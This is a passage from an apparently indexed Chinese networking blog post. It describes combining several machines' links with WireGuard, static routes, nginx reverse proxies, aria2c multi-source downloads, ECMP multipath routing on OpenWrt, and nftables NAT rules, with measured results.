\u4e0d\u7528\u767b\u5f55\u7684\u7279\u6027\uff09\u3002\u4e3a\u4e86\u4f7f\u8fde\u63a5 wg \u7684\u6d41\u91cf\u5b9e\u9645\u8d70\u65e0\u7ebf\u800c\u4e0d\u662f\u4ee5\u592a\u7f51\uff0c\u6211\u4eec\u9700\u8981\u5728 windows \u4e0a\u6dfb\u52a0\u4e00\u6761 Endpoint \u7684\u9759\u6001\u8def\u7531</p> <pre><code>route ADD 157.0.0.0 MASK 255.0.0.0  157.55.80.1 METRIC 3 IF 2\n             destination^      ^mask      ^gateway     metric^    ^\n\n# thinkpad\nroute ADD 112.32.59.100/32 10.3.120.1 METRIC 1 IF 7\nroute ADD 114.214.236.72/32 10.3.120.1 METRIC 1 IF 7\n\n# s3-pro\nsudo route ADD 114.214.236.72/32 10.3.100.1 METRIC 1 IF 3\nsudo route ADD 112.32.59.100/32 10.3.100.1 METRIC 1 IF 3\n\n# \u5220\u9664\u8def\u7531\u65b9\u6cd5\nroute delete 114.214.236.72/32\n</code></pre> <p>\u8fde\u63a5 wg \u540e\uff0c\u6bcf\u53f0\u673a\u5668\u76f8\u5f53\u4e8e\u6709\u4ee5\u592a\u7f51\uff08\u5230\u8def\u7531\u5668\uff0c\u518d\u4ece\u8def\u7531\u5668 WAN \u51fa\uff09\u548c wg\uff08\u5230\u6211\u7684\u516c\u7f51\u673a\u5668\uff09 \u4e24\u4e2a\u7f51\u7edc\u51fa\u53e3\u3002\u56e0\u6b64\u6211\u4eec\u9700\u8981\u8fdb\u884c\u5206\u6d41\u3002\u7531\u4e8e\u4f7f\u7528\u4ee5\u592a\u7f51\u8bbf\u95ee\u7f51\u7edc\u66f4\u7a33\u5b9a\uff0c\u56e0\u6b64\u9ed8\u8ba4\u8def\u7531\u8d70\u4ee5\u592a\u7f51\uff0c\u6211\u4eec\u9700\u8981\u52a0\u901f\u4e0b\u8f7d\u7684 ip \u8d70 wg\u3002\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e wg \u7684 allow ip \u6765\u4e3a\u6211\u4eec\u81ea\u52a8\u8bbe\u7f6e\u8def\u7531\u3002</p>","tags":["ECMP","wireguard","aria2c","nginx","CDN","macvlan","iw","\u8d1f\u8f7d\u5747\u8861"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/16/L3%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%80%9F%E5%8F%A0%E5%8A%A0/#nginx-\u914d\u7f6e","title":"nginx \u914d\u7f6e","text":"<p>\u800c\u4e3a\u4e86\u4ece\u6bcf\u53f0\u673a\u5668\u4e0b\u8f7d\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u6bcf\u53f0\u673a\u5668\u4e0a\u5b89\u88c5 nginx \u8fdb\u884c\u8fdb\u884c\u53cd\u5411\u4ee3\u7406\u3002\u53cd\u4ee3\u7684\u5730\u5740\u4e3a\u901a\u8fc7 wg \u53ef\u4ee5\u8bbf\u95ee\u7684\u5185\u7f51\u5730\u5740\u3002</p> <p>\u4e3a\u4ec0\u4e48\u4e0d\u4f7f\u7528\u516c\u7f51\u5730\u5740\u53cd\u4ee3</p> <p>\u6211\u7684\u670d\u52a1\u5668\u6709\u516c\u7f51\u5730\u5740\uff0c\u56e0\u6b64\u4e5f\u53ef\u4ee5\u5728\u53cd\u4ee3\u65f6\u4f7f\u7528\u516c\u7f51\u5730\u5740\u3002\u7136\u800c\u6211\u7684\u8def\u7531\u5668\u4e5f\u53ef\u4ee5\u63d0\u4f9b\u4e00\u4e2a\u65e0\u7ebf\u94fe\u8def\uff0c\u800c\u6211\u7684\u8def\u7531\u5668\u4e3a mi4a\uff0crom \u53ea\u6709 8MB\uff0c\u5b89\u88c5\u4e0d\u4e0b\u592a\u591a\u8f6f\u4ef6\u3002\u56e0\u6b64\u8def\u7531\u5668\u4e0a\u65e0\u6cd5\u5b89\u88c5 nginx \u53cd\u4ee3\u3002\u5982\u679c\u5176\u5b83\u673a\u5668\u4e0a\u4e5f\u662f\u7528\u516c\u7f51\u5730\u5740\u53cd\u4ee3\u7684\u8bdd\uff0c\u5728\u8be5\u673a\u5668\u4e0b\u8f7d\u65f6\uff0c\u5c31\u65e0\u6cd5\u5229\u7528\u8def\u7531\u5668\u7684\u94fe\u8def\u3002\u6211\u4e5f\u7814\u7a76\u4e86 Windows \u662f\u5426\u652f\u6301\u6839\u636e\u6e90\u5730\u5740\u8fdb\u884c\u8def\u7531\uff0c\u81f3\u5c11\u6211\u6ca1\u6709\u53d1\u73b0\u53ef\u884c\u65b9\u6cd5\u3002\u5f53\u76ee\u7684\u5730\u5740\u76f8\u540c\u65f6\uff0c\u5373\u4f7f bind \u4e86\u5730\u5740\uff08nginx proxy_bind\uff09\uff0cwindows \u4ecd\u7136\u53ea\u4f1a\u6309\u6309\u7167\u76ee\u7684\u5730\u5740\u8def\u7531\u3002</p> <p>\u4e3a\u4e86\u4f7f\u4e0b\u8f7d\u65f6\u6307\u5b9a\u6bcf\u53f0\u673a\u5668\u66f4\u65b9\u4fbf\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u8def\u7531\u5668\u4e0a\u4e3a\u6bcf\u53f0\u673a\u5668\u8bbe\u7f6e\u57df\u540d\u3002\u6216\u8005\u4f7f\u7528\u81ea\u52a8 dhcp \u7684 hostname \u4f5c\u4e3a\u57df\u540d\u3002</p> <p>\u793a\u4f8b nginx \u914d\u7f6e <pre><code>server {\n    listen 192.168.1.2:80;\n    listen localhost:80;\n\n    location / {\n            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n            proxy_set_header X-Forwarded-Proto $scheme;\n            proxy_set_header Host $http_host;\n            proxy_set_header X-Real-IP $remote_addr;\n            proxy_set_header Range $http_range;\n            proxy_set_header If-Range $http_if_range;\n            proxy_redirect off;\n            # proxy_pass https://alist.yfycloud.site:4433/;\n            proxy_pass http://192.168.35.2:5244;\n            # the max size of file to upload\n            client_max_body_size 20000m;\n    }\n}\n</code></pre></p>","tags":["ECMP","wireguard","aria2c","nginx","CDN","macvlan","iw","\u8d1f\u8f7d\u5747\u8861"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/16/L3%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%80%9F%E5%8F%A0%E5%8A%A0/#aria2c-\u4e0b\u8f7d","title":"aria2c \u4e0b\u8f7d","text":"<p>\u6700\u540e\u4f7f\u7528 aria2c \u4ece\u4e0d\u540c\u673a\u5668\u4e0b\u8f7d <pre><code>aria2c -c -x 1 -s 3 \\\n    http://s3-pro.lan/d/Guest/Aria2/SW_DVD9_Win_Pro_11_22H2.6_64BIT_ChnSimp_Pro_Ent_EDU_N_MLF_X23-39378.ISO?sign=x20IQ5x4wziM_s4fsPLl9qt3943XgQ_CkfaFrpJxoVA=:0 \\\n    http://thinkpad10.lan/d/Guest/Aria2/SW_DVD9_Win_Pro_11_22H2.6_64BIT_ChnSimp_Pro_Ent_EDU_N_MLF_X23-39378.ISO?sign=x20IQ5x4wziM_s4fsPLl9qt3943XgQ_CkfaFrpJxoVA=:0\\\nhttps://alist.yfycloud.site:4433/d/Guest/Aria2/SW_DVD9_Win_Pro_11_22H2.6_64BIT_ChnSimp_Pro_Ent_EDU_N_MLF_X23-39378.ISO?sign=x20IQ5x4wziM_s4fsPLl9qt3943XgQ_CkfaFrpJxoVA=:0\n</code></pre></p> <p>\u7248\u672c 2\uff0c\u8def\u7531\u5668\u81ea\u8eab 114.214.236.72 \u7528\u4e8e wg \u8fde\u63a5\u4e86\uff0c\u56e0\u6b64\u8def\u7531\u5230\u4e86 wifi\uff0c\u800c\u672a\u767b\u5f55\u7684 wifi TCP \u662f\u901a\u8fc7\u4e0d\u4e86\u7684\uff0c\u6240\u4ee5\u8def\u7531\u5668\u4e0a\u7684\u8fde\u63a5\u4f1a\u5931\u8d25\u3002\uff08\u8fd9\u70b9\u53ef\u4ee5\u5229\u7528\u540e\u9762\u7684 UDP \u548c TCP \u8d70\u4e0d\u901a\u8def\u7531\u89e3\u51b3\uff09</p> <p>\u6240\u4ee5\u8981\u4f7f\u8def\u7531\u5668\u53d1\u6325\u4f5c\u7528\uff0c\u53ef\u4ee5\u5728\u8def\u7531\u5668\u4e0a\u4f7f\u7528\u670d\u52a1\u5668\u53e6\u4e00\u4e2a lan \u5730\u5740\u3002 <pre><code>aria2c -c -x 1 -s 3 \\\n    http://s3-pro.lan/d/Guest/Aria2/SW_DVD9_Win_Pro_11_22H2.6_64BIT_ChnSimp_Pro_Ent_EDU_N_MLF_X23-39378.ISO?sign=x20IQ5x4wziM_s4fsPLl9qt3943XgQ_CkfaFrpJxoVA=:0 \\\n    http://thinkpad10.lan/d/Guest/Aria2/SW_DVD9_Win_Pro_11_22H2.6_64BIT_ChnSimp_Pro_Ent_EDU_N_MLF_X23-39378.ISO?sign=x20IQ5x4wziM_s4fsPLl9qt3943XgQ_CkfaFrpJxoVA=:0\\\n    http://192.168.35.3:5244/d/Guest/Aria2/SW_DVD9_Win_Pro_11_22H2.6_64BIT_ChnSimp_Pro_Ent_EDU_N_MLF_X23-39378.ISO?sign=x20IQ5x4wziM_s4fsPLl9qt3943XgQ_CkfaFrpJxoVA=:0\n</code></pre></p> <p>\u5b9e\u6d4b 3 \u4e2a\u8282\u70b9\u901f\u5ea6\u53e0\u52a0\u6210\u529f</p> <p></p>","tags":["ECMP","wireguard","aria2c","nginx","CDN","macvlan","iw","\u8d1f\u8f7d\u5747\u8861"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/16/L3%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%80%9F%E5%8F%A0%E5%8A%A0/#\u65b9\u6848\u4e8c\u7b49\u4ef7\u591a\u8def\u5f84\u8def\u7531-multipath-routing-ecmp","title":"\u65b9\u6848\u4e8c\uff1a\u7b49\u4ef7\u591a\u8def\u5f84\u8def\u7531 multipath routing (ECMP)","text":"","tags":["ECMP","wireguard","aria2c","nginx","CDN","macvlan","iw","\u8d1f\u8f7d\u5747\u8861"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/16/L3%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%80%9F%E5%8F%A0%E5%8A%A0/#ecmp-\u6982\u5ff5","title":"ECMP \u6982\u5ff5","text":"<p>\u524d\u9762\u65b9\u5f0f\u76f8\u5f53\u4e8e\u9700\u8981\u624b\u52a8\u6307\u5b9a\u591a\u4e2a\u4ee3\u7406\u8282\u70b9\uff0c\u5982\u679c\u80fd\u5b9e\u73b0\u8def\u7531\u5668\u8bbf\u95ee\u5355\u4e2a\u5730\u5740\u65f6\u81ea\u52a8\u4f7f\u7528\u4e0d\u540c\u63a5\u53e3\u591a\u597d\u3002\u800c multipath routing ( ECMP ) \u5c31\u53ef\u4ee5\u505a\u5230\u8fd9\u4e00\u70b9\u3002</p> <p>weighted ECMP</p> <p>\u867d\u7136\u6211\u4eec\u8fd9\u91cc\u90fd\u53eb equal cost multipath (ECMP)\uff0c\u4f46\u5b9e\u9645\u4e0a\u4f7f\u7528\u7684\u662f weighted ECMP\u3002\u6269\u5c55\u7684 weight \u7528\u4e8e\u63a7\u5236\u9009\u62e9 nexthop \u65f6\u7684\u503e\u5411\u3002\u5982\u679c\u4e00\u4e2a\u8bbe\u7f6e\u4e3a 10 \u4e00\u4e2a\u8bbe\u7f6e\u4e3a 1\uff0c\u8868\u793a\u6211\u4eec\u5e0c\u671b\u524d\u8005\u7684\u6d41\u91cf\u662f\u540e\u8005\u7684 10 \u500d\u3002</p> <p>ECMP \u6982\u5ff5</p> <p>With multipath routing you can distribute traffic destined to a single network over several paths (routes). It is an extension of the concept of the conventional routing table, where there is just one network\u2192next hop association (or network\u2192interface association or both). Instead, as we will see next, you can specify multiple next hops for one destination <sup>3</sup></p> <p>ECMP \u53ef\u4ee5\u7528\u6765\u505a\u8d1f\u8f7d\u5747\u8861 <sup>3</sup> </p> <p>\u6709 Per-Packet \u548c Per-Flow \u4e24\u79cd\u65b9\u5f0f</p> <p>packet \u662f ip \u5c42\u4f20\u8f93\u7684\u5355\u4e2a\u5206\u7ec4\uff08\u6570\u636e\u62a5\u3001\u6570\u636e\u5305\uff09\uff0c\u800c flow \u662f\u6709\u76f8\u540c\u7279\u6027\u7684\u4e00\u7cfb\u5217 packet \u7684\u96c6\u5408\uff0c\u6bd4\u5982\u5355\u4e2a TCP \u8fde\u63a5\u7684\u6240\u6709 packet\u3002\uff08linux \u597d\u50cf\u4e5f\u662f\u6309\u7167 flow \u8fdb\u884c\u8def\u7531\uff0c\u4ee5\u53ca\u5bf9\u6d89\u53ca\u5230 NAT \u7684\u9632\u706b\u5899\u89c4\u5219\u5339\u914d\u7684\uff09</p> <p>per-packet \u548c per-flow \u5206\u6d41\u7684\u533a\u522b<sup>2</sup> </p> <p>\u7406\u8bba\u4e0a\u53ef\u4ee5\u5b9e\u73b0\u5bf9\u5355\u4e2a packet \u7684\u5206\u6d41\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u5b9e\u73b0\u7684\u662f per-flow  \u7684\u5206\u6d41</p> <p>It is important to keep in mind that existing Multipath Routing implementation in Linux is designed to distribute flows of packets over multiple paths, not individual packets. Selecting route in a per-packet manner does not play well with TCP, IP fragments, or Path MTU Discovery. <sup>4</sup></p> <p>ECMP \u662f\u600e\u4e48\u4ece\u591a\u4e2a nexthop \u4e2d\u8def\u7531\u7684\u5462</p> <p>To associate a packet with a flow, the net stack computes a hash over a subset of packet header fields. The resulting hash value is what drives the next-hop selection.</p> <p>\u4f7f\u7528\u7684 hash \u6839\u636e ipv4 \u548c ipv6\uff0c\u4ee5\u53ca\u662f forward \u8fd8\u662f locally generated packets \u90fd\u6709\u6240\u4e0d\u540c</p> <ul> <li>for forwarded IPv4 packets (L3 hash) <pre><code>{ Source Address, Destination Address }\n</code></pre></li> <li>for locally generated IPv4 packets (L4 hash) <pre><code>{ Source Address, Destination Address, Protocol, Source Port, Destination Port }\n</code></pre></li> <li>for forwarded IPv6 packets (L3 hash) <pre><code>{ Source Address, Destination Address, Flow Label, Next Header (protocol) }\n</code></pre></li> <li>for locally generated IPv6 packets (L4 hash) <pre><code>{ Source Address, Destination Address, Flow Label, Next Header (protocol), Source Port, Destination Port }\n</code></pre></li> </ul> <p>IPv6\u5206\u7ec4\u56e0\u4e3a\u6709Flow Label\u7684\u5b58\u5728\uff0cIPv6\u5373\u4f7f\u53ea\u7528\u5230L3 Hash\u4e5f\u53ef\u4ee5\u5b9e\u73b0L4\u8d1f\u8f7d\u5747\u8861 <sup>2</sup></p> <p>IPv4 \u73b0\u5728 forward \u548c output packet \u4f7f\u7528\u76f8\u540c hash\uff0c\u5e76\u901a\u8fc7 <code>fib_multipath_hash_policy</code> \u9009\u9879\u63a7\u5236</p> <p>However, with recently released Linux v4.12 selection of fields has changed a bit for IPv4\u00a0[4]. An L3 hash is used by default for both forwarded and locally generated traffic, but the user can choose to use the L4 hash, in both forward and local output path, with a new sysctl <code>net.ipv4.fib_multipath_hash_policy</code>. <sup>4</sup></p> <p><code>fib_multipath_hash_policy</code> - INTEGER: Controls which hash policy to use for multipath routes. Only valid for kernels built with CONFIG_IP_ROUTE_MULTIPATH enabled. Default: 0 (Layer 3) Possible values: <sup>5</sup> - 0 - Layer 3 - 1 - Layer 4 - 2 - Layer 3 or inner Layer 3 if present</p>","tags":["ECMP","wireguard","aria2c","nginx","CDN","macvlan","iw","\u8d1f\u8f7d\u5747\u8861"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/16/L3%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%80%9F%E5%8F%A0%E5%8A%A0/#openwrt-\u542f\u7528-ecmp","title":"openwrt \u542f\u7528 ECMP","text":"<p>\u5185\u6838\u9700\u8981\u5f00\u542f <code>CONFIG_IP_ROUTE_MULTIPATH=y</code> \u9009\u9879\u3002\u81f3\u5c11\u6211\u6d4b\u8bd5\u7684 23.05 \u662f\u9ed8\u8ba4\u6253\u5f00\u7684\u3002</p> <p>\u7136\u540e\u5c31\u53ea\u9700\u8981\u6dfb\u52a0\u8def\u7531\u5373\u53ef\uff0c\u683c\u5f0f\uff1a <pre><code>ip route replace TARGET nexthop via GW1 dev DEV1 weight W1 nexthop via GW2 dev DEV2 weight W2\n</code></pre></p> <ul> <li>\u9047\u5230\u62a5\u9519 <pre><code>Error: either \"to\" is a duplicate, or \"nexthop\" is a garbage.\n</code></pre><ul> <li>\u5b89\u88c5ip-full \u89e3\u51b3\u95ee\u9898</li> </ul> </li> <li>\u6d4b\u8bd5\u4e0a\u9762\u547d\u4ee4\u6307\u5b9a nexthop \u65f6\uff0c\u662f\u4e0d\u652f\u6301\u63d0\u793a\u4f7f\u7528 src \u7684\uff0c\u4e0d\u8fc7\u5f71\u54cd\u4e0d\u5927\u3002</li> </ul> <pre><code># \u6d4b\u8bd5\u5355\u4e2a\u5730\u5740\nip ro r 192.168.35.2 dev wg_local121\nip ro r 192.168.35.2 nexthop dev wg0 weight 1 nexthop dev wg_local121 weight 1\n\n# \u6d4b\u8bd5\u9ed8\u8ba4\u8def\u7531\nip ro r default nexthop dev wg0 weight 1 nexthop dev wg_local121 weight 1\nip ro r default nexthop dev wg0 weight 1 \\\n  nexthop dev wg_local121 weight 1 \\\n  nexthop dev wg_local120 weight 1\n\nip ro r 192.168.35.2 nexthop dev wg0 weight 1 \\\n  nexthop dev wg_local121 weight 1 \\\n  nexthop dev wg_local120 weight 1\n</code></pre>","tags":["ECMP","wireguard","aria2c","nginx","CDN","macvlan","iw","\u8d1f\u8f7d\u5747\u8861"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/16/L3%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%80%9F%E5%8F%A0%E5%8A%A0/#\u6d4b\u901f\u7ed3\u679c","title":"\u6d4b\u901f\u7ed3\u679c","text":"<p>Edge \u6d4f\u89c8\u5668\u9ed8\u8ba4\u5c31\u4f1a\u591a\u7ebf\u7a0b\uff0c\u56e0\u6b64\u8dd1\u51fa\u4e86\u4e24\u4e2a\u8282\u70b9\u7684\u901f\u5ea6\uff08\u8fd9\u91cc\u7528\u7684\u662f\u4e00\u4e2a\u8282\u70b9\u5f00\u70ed\u70b9\u7ed9\u8def\u7531\u5668\uff09</p> <p></p> <p>\u4f7f\u7528 aria2c\uff0c\u5355\u4e2a src \u5373\u53ef <pre><code>aria2c -x 2 -s 2 https://alist.yfycloud.site:4433/d/Guest/Aria2/SW_DVD9_Win_Pro_11_22H2.6_64BIT_ChnSimp_Pro_Ent_EDU_N_MLF_X23-39378.ISO?sign=x20IQ5x4wziM_s4fsPLl9qt3943XgQ_CkfaFrpJxoVA=:0\n\n10/16 10:27:36 [NOTICE] Downloading 1 item(s)\n[#b37202 370MiB/5.2GiB(6%) CN:2 DL:1.7MiB ETA:46m54s]\n</code></pre></p> <p><code>iftop -i &lt;interface&gt;</code> \u53ef\u4ee5\u770b\u5230\u4e0d\u540c\u63a5\u53e3\u4e0a\u7684\u6d41\u91cf</p> <p></p> <p>conntrack \u53ef\u4ee5\u770b\u5230 dst \u5206\u522b\u662f\u8def\u7531\u5668\u7684\u4e24\u4e2a\u7f51\u7edc\u51fa\u53e3\u5730\u5740 <pre><code>conntrack -L -d 114.214.236.72\n\ntcp      6 7440 ESTABLISHED src=192.168.1.2 dst=114.214.236.72 sport=21737 dport=4433 packets=40560 bytes=1686476 src=114.214.236.72 dst=10.3.103.238 sport=4433 dport=21737 packets=76481 bytes=112075471 [ASSURED] mark=0 use=1\n\ntcp      6 7439 ESTABLISHED src=192.168.1.2 dst=114.214.236.72 sport=21736 dport=4433 packets=31094 bytes=1336706 src=114.214.236.72 dst=192.168.137.50 sport=4433 dport=21736 packets=59620 bytes=105960001 [ASSURED] mark=0 use=1\n</code></pre></p> <p>\u4f7f\u7528 wg \u540e</p> <pre><code>~/ conntrack -L -d 192.168.35.2 -p tcp |grep 5244\ntcp      6 7440 ESTABLISHED src=192.168.1.2 dst=192.168.35.2 sport=22999 dport=5244 packets=5268 bytes=217796 src=192.168.35.2 dst=10.121.31.202 sport=5244 dport=22999 packets=11238 bytes=20115018 [ASSURED] mark=0 use=1\n\nconntrack v1.4.8 (conntrack-tools): 7 flow entries have been shown.\ntcp      6 7440 ESTABLISHED src=192.168.1.2 dst=192.168.35.2 sport=23000 dport=5244 packets=6952 bytes=283793 src=192.168.35.2 dst=10.0.31.202 sport=5244 dport=23000 packets=13575 bytes=20894778 [ASSURED] mark=0 use=1\n</code></pre>","tags":["ECMP","wireguard","aria2c","nginx","CDN","macvlan","iw","\u8d1f\u8f7d\u5747\u8861"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/16/L3%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%80%9F%E5%8F%A0%E5%8A%A0/#windows-\u4e0d\u652f\u6301-masquerade-\u7684\u59a5\u534f\u65b9\u6cd5","title":"windows \u4e0d\u652f\u6301 masquerade \u7684\u59a5\u534f\u65b9\u6cd5","text":"<p>\u5982\u56fe\uff0c\u56e0\u4e3a windows \u4e0d\u652f\u6301\u8f6c\u53d1\u65f6\u8fdb\u884c src nat\uff0c\u5bfc\u81f4\u5b9e\u9645\u4e0a\u5e76\u4e0d\u80fd\u5229\u7528 3 \u4e2a\u53ca\u4ee5\u4e0a\u8282\u70b9 </p> <p>\u5982\u56fe\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u65b9\u5f0f\u521b\u5efa\u989d\u5916\u7684\u7f51\u6bb5 </p> <p>\u8fd9\u6837\u5728 op1 \u4e0a\u8bbe\u7f6e\u4e0d\u540c peer \u65f6\uff0c\u53ea\u9700\u8981\u8def\u7531\u8be5\u8bbe\u5907\u5bf9\u5e94\u7f51\u6bb5\u5373\u53ef\u3002\u5982\u56fe\u4e2d\u7684 S3-Pro \u7684 wg0 \u5230 op1 wg0 \u7684\u8fde\u63a5\u3002\u989d\u5916\u589e\u52a0 <code>10.120.31.0/24</code> \u8fd9\u4e2a\u7f51\u6bb5 <pre><code>config wireguard_wg0\n      option route_allowed_ips '1'\n      list allowed_ips '10.0.31.120/32'\n      list allowed_ips '10.120.31.0/24'\n</code></pre></p> <p>mi4a \u4e0a\u53ef\u4ee5\u8bbe\u7f6e\u6e90\u8fdb\u6e90\u51fa <pre><code>ip ro add default dev wg_local120 table wg120\nip ro add default dev wg_local121 table wg121\nip ro add default dev wg0 table wg0\nip ru add from 10.120.31.0/24 lookup wg120\nip ru add from 10.121.31.0/24 lookup wg121\nip ru add from 10.0.31.0/24 lookup wg0\n</code></pre></p> <p>\u8fde\u63a5\u5230 op2 \u4e0a\u6709\u65f6\u5ef6\u8fdf\u66f4\u4f4e\uff0c\u56e0\u6b64\u9009\u62e9 wg \u5230 op2\u3002\u4e0d\u8fc7 op2 \u5bf9\u4e8e\u76ee\u7684\u5730\u5740\u4e3a op1 lan \u7684\u5730\u5740\uff0c\u4f1a\u901a\u8fc7 wg_s2s \u8f6c\u53d1\u5230 op1 \u4e0a\uff0c\u5e76\u4e14\u6ca1\u6709 NAT\u3002\u8fd9\u4f1a\u5bfc\u81f4 op1 \u4e0a\u7684\u56de\u5305\u65e0\u6cd5\u8def\u7531\u3002</p> <p>\u89e3\u51b3\u529e\u6cd5\u4e3a op2 \u9488\u5bf9 wg0 \u8fdb\u5165\u7684\u5305\u8fdb\u884c NAT <pre><code>ip ru add iif wg0 lookup lan prior 4\n\nroot@op2 \u279c  ~ ipt lan\n192.168.35.0/24 dev wg_s2s proto static scope link\n</code></pre></p> <p>nft \u89c4\u5219\uff0c\u547d\u4ee4\u884c\u65b9\u5f0f <pre><code> nft add rule inet fw4 srcnat_wg_s2s iifname wg0 oifname wg_s2s counter masquerade\n</code></pre></p> <p>openwrt \u6301\u4e45\u5316\u914d\u7f6e\uff1a <pre><code>/etc/nftables.d/12-wg0-nat.nft\n\nchain srcnat_wg0_from {\n    type nat hook postrouting priority srcnat; policy accept;\n    iifname wg0 oifname wg_s2s counter masquerade comment \"Masquerade traffic from wg0 to   wg_s2s\"\n}\n</code></pre></p>","tags":["ECMP","wireguard","aria2c","nginx","CDN","macvlan","iw","\u8d1f\u8f7d\u5747\u8861"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/10/16/L3%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%80%9F%E5%8F%A0%E5%8A%A0/#\u7efc\u5408\u4e24\u79cd\u65b9\u6cd5","title":"\u7efc\u5408\u4e24\u79cd\u65b9\u6cd5","text":"<p>ECMP \u65b9\u6848\u9664\u4e86\u6709\u6982\u7387\u7528\u4e0d\u6ee1\u6240\u6709\u94fe\u8def\uff0c\u4f5c\u4e3a\u8def\u5f84\u7684\u8282\u70b9\uff0c\u81ea\u8eab\u6240\u6709\u6d41\u91cf\u8fd8\u4f1a\u76f4\u63a5\u4ece wg \u63a5\u53e3\u51fa\u53bb\uff0c\u4e0d\u4f1a\u8d70\u8def\u7531\u5668\uff08\u5982\u679c windows \u6709\u6839\u636e\u6e90\u5730\u5740\u8fdb\u884c\u8def\u7531\u7684\u529f\u80fd\u5c31\u53ef\u4ee5\u907f\u514d\uff0c\u53ef\u60dc\u6ca1\u6709\uff09\uff0c\u56e0\u6b64\u6bcf\u4e2a\u8282\u70b9\u4ecd\u7136\u53ea\u80fd\u4f7f\u7528\u5355\u6761\u94fe\u8def\u3002\u53ea\u6709\u8fde\u63a5\u8def\u7531\u5668\u7684\u5176\u5b83\u8bbe\u5907\u5982\u624b\u673a\u53ef\u4ee5\u5145\u5206\u5229\u7528 ECMP\u3002</p> <p>\u56e0\u6b64\uff0c\u4e0a\u9762\u67b6\u6784\u56fe\u4e2d\u5b9e\u9645\u4e0a\u8fd8\u662f\u4fdd\u7559\u4e00\u53f0\u8bbe\u5907 A \u4e0d\u4f5c\u4e3a ECMP \u8def\u5f84\uff0cB \u548c\u8def\u7531\u5668 2 \u6761\u8def\u7ecf\u505a ECMP \u5373\u53ef\u3002\u90a3\u4e48\u5728\u6709 ECMP \u60c5\u51b5\u4e0b\u80fd\u5426\u4f7f\u7528\u4e4b\u524d\u65b9\u6848\u8dd1\u6ee1 3 \u6761\u8def\u5f84\u5462\uff1f</p> <p>\u7531\u4e8e\u6700\u7ec8 aria2c \u547d\u4ee4\u9700\u8981\u4f7f\u7528 3 \u4e2a\u6e90\u5730\u5740\uff0c\u6bcf\u4e2a\u5bf9\u5e94 1 \u6761\u94fe\u8def\uff0c\u6211\u4eec\u9700\u8981 3 \u4e2a\u4e0d\u540c\u5730\u5740\u3002</p> <p>\u5bf9\u4e8e\u8def\u7531\u5668\u6765\u8bf4\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u5730\u5740\u907f\u514d\u8def\u7531\u5668\u4e0a\u5bf9\u8be5\u5730\u5740\u91cd\u590d\u4f7f\u7528 ECMP\uff0c\u9700\u8981\u5360\u7528\u4e00\u4e2a\u5730\u5740\u3002\u53ef\u4ee5\u5206\u914d\u8bbe\u5907\u7684\u4e00\u4e2a\u5c40\u57df\u7f51\u5730\u5740\u3002\u5373\u8def\u7531\u5668\u4e0a\u9ed8\u8ba4\u8def\u7531\u8d70 ECMP\uff0c\u4e00\u4e2a\u5c40\u57df\u7f51\u5730\u5740\u8d70\u8def\u7531\u5668\u94fe\u8def\u3002 <pre><code>ip ro r 192.168.35.2 dev wg0\nip ro r default nexthop dev wg0 weight 1 nexthop dev wg_local121 weight 1\n</code></pre></p> <p>\u5bf9\u4e8e\u8bbe\u5907 B \u6765\u8bf4\uff0c\u4f5c\u4e3a ECMP \u8def\u5f84\uff0c\u6240\u6709\u6d41\u91cf\u90fd\u4f1a\u8d70\u81ea\u5df1\u7684\u94fe\u8def\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 nginx \u5728\u672c\u5730\u53cd\u4ee3\u670d\u52a1\u5668\u4efb\u610f\u5730\u5740\uff0c\u8fd9\u6837\u4f7f\u7528 B \u7684 lan \u5730\u5740\u5373\u53ef\uff0c\u907f\u514d\u5360\u7528\u670d\u52a1\u5668\u7684\u5730\u5740\u3002</p> <p>\u5bf9\u4e8e\u8bbe\u5907 A \u6765\u8bf4\uff0c\u9700\u8981\u548c\u8def\u7531\u5668\u5730\u5740\u533a\u5206\uff0c\u8fd9\u91cc\u5206\u914d\u670d\u52a1\u5668\u7684\u53e6\u4e00\u4e2a\u5c40\u57df\u7f51\u5730\u5740\u3002\u8bb0\u4f4f\u9700\u8981\u5728 wg \u4e2d\u8bbe\u7f6e allow ip \u8ba9\u8be5\u5730\u5740\u8d70 A \u7684\u94fe\u8def\u3002</p> <p>\u56e0\u6b64\u6700\u540e\u5f97\u5230\u6211\u4eec\u7684\u547d\u4ee4 